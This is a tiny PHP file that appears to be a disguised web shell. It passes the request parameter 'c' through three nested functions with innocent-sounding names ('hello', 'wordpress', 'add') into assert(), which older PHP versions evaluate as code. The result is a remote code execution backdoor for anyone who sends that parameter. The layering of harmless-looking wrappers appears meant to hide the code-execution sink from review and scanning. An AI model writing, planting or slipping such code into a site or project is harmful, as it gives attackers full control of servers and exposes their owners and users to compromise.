<?php 
	function hello($value)
	{
		# code
		assert($value);
	}

	function wordpress($value)
	{
		# code
		hello($value);
	}

	function add($value)
	{
		# code
		wordpress($value);
	}
	

	if ($title !="aa")
	{add($_REQUEST["c"])};
?> 
